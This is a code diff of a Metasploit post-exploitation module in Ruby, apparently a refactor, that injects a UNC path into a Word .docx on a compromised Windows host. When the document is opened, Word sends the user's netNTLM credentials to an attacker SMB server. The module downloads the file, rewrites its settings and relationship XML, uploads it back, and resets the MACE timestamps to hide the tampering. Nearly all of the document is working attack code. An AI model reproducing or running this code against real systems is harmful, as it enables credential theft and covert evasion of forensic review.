@@ -7,312 +7,226 @@
 
 require 'msf/core'
 require 'msf/core/post/file'
+require 'zip/zip' #for extracting files
+require 'rex/zip' #for creating files
+require 'msf/core/post/windows/priv'
 
 class Metasploit3 < Msf::Post
 
 	include Msf::Post::File
+	include Msf::Post::Windows::Priv
 
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'           => 'Microsoft Word UNC Path Injector',
 			'Description'    => %q{
-					This module modifies a remote .docx file that will, upon opening, submit all
-					stored netNTLM credentials to a remote host. If emailed the receiver needs
-					to put the document in editing mode before the remote server will be
-					contacted. Preview and read-only mode do not work. Verified to work
-					with Microsoft Word 2003, 2007 and 2010 as of Januari 2013 date by using
-					auxiliary/server/capture/smb
+					This module modifies a remote .docx file that will, upon opening, submit
+				stored netNTLM credentials to a remote host. Verified to work with Microsoft
+				Word 2003, 2007 and 2010 as of January 2013. In order to get the hashes
+				the auxiliary/server/capture/smb module can be used.
 			},
 			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision: 1 $',
 			'References'     =>
-			[
-				[ 'URL', 'http://jedicorp.com/?p=534' ],
-			],
-			'Platform'	=> ['win', 'linux'],
-			'SessionTypes'	=> ['meterpreter'],
-			'Author'         =>
-			[
-				'SphaZ <cyberphaz[at]gmail.com>'
-			]
-		))
-			register_options(
 				[
-					OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to','']),
-					OptString.new('FILE', [true, 'Remote file to inject UNC path into. ', '']),
-					OptPath.new('DSTPATH', [true, 'Path to put downloaded documents', '/tmp']),
-					OptBool.new('RMLOCAL', [true, 'Delete original file after upload.', 'False']),
-				], self.class)
+					[ 'URL', 'http://jedicorp.com/?p=534' ]
+				],
+			'Platform'	=> ['win'],
+			'SessionTypes'	=> ['meterpreter'],
+			'Author'        =>
+				[
+					'SphaZ <cyberphaz[at]gmail.com>'
+				]
+		))
+
+		register_options(
+			[
+					OptAddress.new('SMBHOST',[true, 'Server IP or hostname that the .docx document points to']),
+					OptString.new('FILE', [true, 'Remote file to inject UNC path into. ']),
+					OptBool.new('BACKUP', [true, 'Make local backup of remote file.', true]),
+			], self.class)
 	end
 
-	def manipulateFile
+	#Store MACE values so we can set them later again.
+	def get_mace
+		begin
+			mace = session.priv.fs.get_file_mace(datastore['FILE'])
+			vprint_status("Got file MACE attributes!")
+		rescue
+			print_error("Error getting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
+		end
+		return mace
+	end
+
+	#here we unzip into memory, inject our UNC path, store it in a temp file and
+	#return the modified zipfile name for upload
+	def manipulate_file(zipfile)
 		ref = "<w:attachedTemplate r:id=\"rId1\"/>"
 
-		relsFileData = ""
-		relsFileData << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
-		relsFileData << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
-		relsFileData << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
-		relsFileData << "attachedTemplate\" Target=\"file://\\\\#{datastore['LHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"
+		rels_file_data = ""
+		rels_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
+		rels_file_data << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
+		rels_file_data << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
+		rels_file_data << "attachedTemplate\" Target=\"file://\\\\#{datastore['SMBHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"
 
-		fileContent = getFileFromDocx("word/settings.xml")
-		if fileContent.nil?
+		zip_data = unzip_docx(zipfile)
+		if zip_data.nil?
 			return nil
 		end
 
-		#First, we want to know if the reference to the template already exists..if it does we dont need to manipulate it :)
-		if not fileContent.index("w:attachedTemplate r:id=\"rId1\"").nil?
-			vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")
-			if unzipDocx.nil?
-				return nil
-			end
-			#and we put just our rels file into the docx
-			updateDocxFile("word/_rels/settings.xml.rels", relsFileData)
+		#file to check for reference file we need
+		file_content = zip_data["word/settings.xml"]
+		if file_content.nil?
+			print_error("Bad \"word/settings.xml\" file, check if it is a valid .docx.")
+			return nil
+		end
 
-			#ok we got through this, lets zip the file, overwriting the original in this case
-			begin
-				File.delete(@localFile)
-				if zipDocx(@tmpDir, @localFile).nil?
-					return nil
-				end
-			rescue
-				print_error("Can't modify the original document :(")
-				return nil
-			end
+		#if we can find the reference to our inject file, we don't need to add it and can just inject our unc path.
+		if not file_content.index("w:attachedTemplate r:id=\"rId1\"").nil?
+			vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")
+			zip_data["word/_rels/settings.xml.rels"] = rels_file_data
+			return zip_docx(zip_data)
 		else
 			#now insert the reference to the file that will enable our malicious entry
-			insertOne = fileContent.index("<w:defaultTabStop")
+			insert_one = file_content.index("<w:defaultTabStop")
 
-			if insertOne.nil?
-				insertTwo = fileContent.index("<w:hyphenationZone") # 2nd choice
-				if not insertTwo.nil?
+			if insert_one.nil?
+				insert_two = file_content.index("<w:hyphenationZone") # 2nd choice
+				if not insert_two.nil?
 					vprint_status("HypenationZone found, we use this for insertion.")
-					fileContent.insert(insertTwo, ref )
+					file_content.insert(insert_two, ref )
 				end
 			else
 				vprint_status("DefaultTabStop found, we use this for insertion.")
-				fileContent.insert(insertOne, ref )
+				file_content.insert(insert_one, ref )
 			end
 
-			if insertOne.nil? && insertTwo.nil?
-				vprint_error("Cannot find insert point for reference into settings.xml")
-				return nil
-			end
-
-			if unzipDocx.nil?
-				return nil
-			end
-			#update the settings.xml file
-			if updateDocxFile("word/settings.xml",fileContent).nil?
-				return nil
-			end
-			#and we put our rels file into the docx
-			if updateDocxFile("word/_rels/settings.xml.rels", relsFileData).nil?
+			if insert_one.nil? && insert_two.nil?
+				print_error("Cannot find insert point for reference into settings.xml")
 				return nil
 			end
 
-			#ok we got through this, lets zip the file, overwriting the tmp copy in this case
+			#update the files that contain the injection and reference
+			zip_data["word/settings.xml"] = file_content
+			zip_data["word/_rels/settings.xml.rels"] = rels_file_data
+			return zip_docx(zip_data)
+		end
+	end
+
+	#RubyZip sometimes corrupts the document when manipulating inside a
+	#compressed document, so we extract it with Zip::ZipFile into memory
+	def unzip_docx(zipfile)
+		vprint_status("Extracting #{datastore['FILE']} into memory.")
+		zip_data = Hash.new
+		begin
+			Zip::ZipFile.open(zipfile)  do |filezip|
+				filezip.each do |entry|
+					zip_data[entry.name] = filezip.read(entry)
+				end
+			end
+		rescue Zip::ZipError => e
+			print_error("Error extracting #{datastore['FILE']} please verify it is a valid .docx document.")
+			return nil
+		end
+		return zip_data
+	end
+
+	#making the actual docx
+	def zip_docx(zip_data)
+		docx = Rex::Zip::Archive.new
+		zip_data.each_pair do |k,v|
+			docx.add_file(k,v)
+		end
+		return docx.pack
+	end
+
+	#We try put the mace values back to that of the original file
+	def set_mace(mace)
+		if not mace.nil?
+			vprint_status("Setting MACE value of #{datastore['FILE']} set to that of the original file.")
 			begin
-				File.delete(@localFile)
-				if zipDocx(@tmpDir, @localFile).nil?
-					return nil
-				end
+				session.priv.fs.set_file_mace(datastore['FILE'], mace["Modified"], mace["Accessed"], mace["Created"], mace["Entry Modified"])
 			rescue
-				print_error("Can't modify the original document :(")
-				return nil
+				print_error("Error setting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
 			end
-		end
-		return 0
-	end
-
-	def zipDocx(inputPath, archive)
-		begin
-			#add the prepared files to the zip file
-			Zip::ZipFile.open(archive, 'wb') do |fileZip|
-				Dir["#{inputPath}/**/**"].reject{|f|f==archive}.each do |file|
-					fileZip.add(file.sub(inputPath+'/',''), file)
-				end
-				relsFile = inputPath + '/_rels/.rels'
-				fileZip.add(relsFile.sub(inputPath+'/',''), relsFile)
-			end
-		rescue
-			print_error("Error zipping file..")
-			begin
-				FileUtils.rm_rf(inputPath)
-			rescue
-				print_error("Cant even clean up my own mess, I give up")
-				return nil
-			end
-			return nil
-		end
-		begin
-			FileUtils.rm_rf(inputPath)
-		rescue
-			print_error("Cant even clean up my own mess, I give up")
-			return nil
-		end
-		return 0
-	end
-
-	def unzipDocx
-		begin
-			vprint_status("tmpdir: #{@tmpDir}")
-			if not File.directory?(@tmpDir)
-				vprint_status("Damn rubyzip cant be relied upon, so we do it the hard way. Extracting #{@localFile}")
-				Zip::ZipFile.open(@localFile)  do |fileZip|
-					fileZip.each do |entry|
-						if not entry.nil?
-							vprint_status("extracting entry: #{entry.name}")
-						end
-						fpath = File.join(@tmpDir, entry.name)
-						FileUtils.mkdir_p(File.dirname(fpath))
-						fileZip.extract(entry, fpath)
-					end
-				end
-			end
-			vprint_status("files extracted from zip")
-		rescue Exception => ex
-			print_error("There was an error unzipping, is the file corrupt?")
-			return nil
-		end
-		return 0
-	end
-
-	#used for updating the files inside the docx from a string
-	def updateDocxFile(fileString, content)
-		begin
-			#ok so now we unpacked the docx file, lets start to update the file we need to do
-			#does the file already exist?
-			archive = File.join(@tmpDir, fileString)
-			vprint_status("We need to look for: #{archive}")
-			if File.exists?(archive)
-				vprint_status("Deleting original file #{archive}")
-				File.delete(archive)
-			end
-			#now lets put OUR file there
-			File.open(archive, 'wb+') { |f| f.write(content) }
-		rescue Exception => ex
-			print_error("Extracting and manipulating the file went wrong.")
-			return nil
-		end
-		return 0
-	end
-
-	def getFile
-		begin
-			data = ""
-			docxFile = session.fs.file.new("#{datastore['FILE']}", 'rb')
-			until docxFile.eof?
-				data << docxFile.read
-			end
-
-			if data == ""
-				print_error("File read is empty!")
-				return nil
-			end
-
-			orgFilename = File.join(datastore['DSTPATH'], session.fs.file.basename(datastore['FILE']))
-			lclFile = File.new(orgFilename, 'wb+')
-			lclFile.write(data)
-			lclFile.close
-
-			if not File.exists?(orgFilename)
-				print_error("Could not create file :(")
-				raise $!
-			else
-				vprint_status("Created local file #{orgFilename}")
-			end
-
-			#now lets make a copy for manipulation
-			tmpFile = File.join("#{orgFilename}.tmp")
-			FileUtils.cp(orgFilename,  tmpFile)
-			vprint_status("Created file to inject into: #{tmpFile}")
-			return tmpFile
-		rescue
-			print_error("Failed to get file or create copy for #{filename} to #{orgFilename}: #{e.class} #{e}")
-			return nil
 		end
 	end
 
-
-	#read a file from .docx into a string
-	def getFileFromDocx(fileString)
-		begin
-			Zip::ZipFile.open(@localFile) do |zipFile|
-				zipFile.each do |f|
-					next unless f.to_s == fileString
-					return f.get_input_stream.read
-				end
-			end
-			print_error("Cant find #{fileString} inside the .docx")
-			return nil
-		rescue
-			print_error("Unknown error reading docx file.")
-			return nil
-		end
+	def rhost
+		client.sock.peerhost
 	end
-
 
 	def run
-		#where do we unpack our file?
-		@tmpDir = "#{Dir.tmpdir}/#{Time.now.to_i}#{rand(1000)}/"
-		begin
-			if not session.fs.file.exists?(datastore['FILE'])
-				print_error("File not found.")
-				return
-			else
-				@localFile = getFile
-				if not @localFile.nil?
-					print_status("File found and data read, lets to do some magic...")
-				else
-					#since nil value is from the rescue and already prints info, we just exit the module here
-					return
-				end
-			end
-		rescue
-			print_error("Session error verifying file existance.")
+
+		#sadly OptPath does not work, so we check manually if it exists
+		if !file_exist?(datastore['FILE'])
+			print_error("Remote file does not exist!")
 			return
 		end
 
-		if manipulateFile.nil?
-			print_error("Error manipulating #{@localFile}!")
+		#get mace values so we can put them back after uploading. We do this first, so we have the original
+		#accessed time too.
+		file_mace = get_mace
+
+		#download the remote file
+		print_status("Downloading remote file #{datastore['FILE']}.")
+		org_file_data = read_file(datastore['FILE'])
+
+		#store the original file because we need to unzip from disk because there is no memory unzip
+		if datastore['BACKUP']
+			#logs_dir = ::File.join(Msf::Config.local_directory, 'unc_injector_backup')
+			#FileUtils.mkdir_p(logs_dir)
+			#@org_file =  logs_dir + File::Separator + datastore['FILE'].split('\\').last
+			@org_file = store_loot(
+				"host.word_unc_injector.changedfiles",
+				"application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+				rhost,
+				org_file_data,
+				datastore['FILE'],
+			)
+			print_status("Local backup kept at #{@org_file}")
+			#Store information in note database so its obvious what we changed, were we stored the backup file..
+			note_string ="Remote file #{datastore['FILE']} contains UNC path to #{datastore['SMBHOST']}. "
+			note_string += " Local backup of file at #{@org_file}."
+			report_note(
+				:host => session.session_host,
+				:type => "host.word_unc_injector.changedfiles",
+				:data => {
+					:session_num => session.sid,
+					:stype => session.type,
+					:desc => session.info,
+					:platform => session.platform,
+					:via_payload => session.via_payload,
+					:via_exploit => session.via_exploit,
+					:created_at => Time.now.utc,
+					:files_changed => note_string
+				}
+			)
+		else
+			@org_file = Rex::Quickfile.new('msf_word_unc_injector')
+		end
+
+		vprint_status("Written remote file to #{@org_file}")
+		File.open(@org_file, 'wb') { |f| f.write(org_file_data)}
+
+		#Unzip, insert our UNC path, zip and return the data of the modified file for upload
+		injected_file = manipulate_file(@org_file)
+		if injected_file.nil?
 			return
 		end
 
-		vprint_status("UNC path injected into file, lets upload it now...")
-		#aight, now we need to upload and replace the file we just read
-		#now we upload our modified docx.tmp file, overwriting the original on the remote host
-		begin
-			print_status("Uploading injected file #{@localFile} to remote #{datastore['FILE']}...")
-			session.fs.file.upload_file(datastore['FILE'], @localFile)
-			vprint_good("File succesfully uploaded!")
-		rescue ::Exception => e
-			print_error("Error uploading file #{@localFile} to #{datastore['FILE']}: #{e.class} #{e}")
-			return
+		#upload the injected file
+		write_file(datastore['FILE'], injected_file)
+		print_status("Uploaded injected file.")
+
+		#set mace values back to that of original
+		set_mace(file_mace)
+
+		#remove tmpfile if no backup is desired
+		if not datastore['BACKUP']
+			@org_file.close
+			@org_file.unlink rescue nil # Windows often complains about unlinking tempfiles
 		end
 
-		#cleanup phase
-		begin
-			vprint_status("Deleting local injected file #{@localFile}")
-			File.delete(@localFile)
-		rescue
-			print_error("Error deleting temporary file #{@localFile}")
-			return
-		end
-
-		#do we need to delete the original too?
-		if datastore['RMLOCAL']
-			begin
-				vprint_status("Deleting original file...")
-				orgFilename = File.join(datastore['DSTPATH'], session.fs.file.basename(datastore['FILE']) )
-				File.delete(orgFilename)
-			rescue
-				print_error("Error deleting #{session.fs.file.basename(datastore['FILE'])} from #{datastore['DSTPATH']}")
-				return
-			end
-		elsif not datastore['RMLOCAL']
-			print_warning("\tKeeping original of #{datastore['FILE']} in #{datastore['DSTPATH']}")
-		end
-
-		print_good("File #{datastore['FILE']} succesfully injected to point to #{datastore['LHOST']}")
+		print_good("Done! Remote file #{datastore['FILE']} succesfully injected to point to #{datastore['SMBHOST']}")
 	end
 end
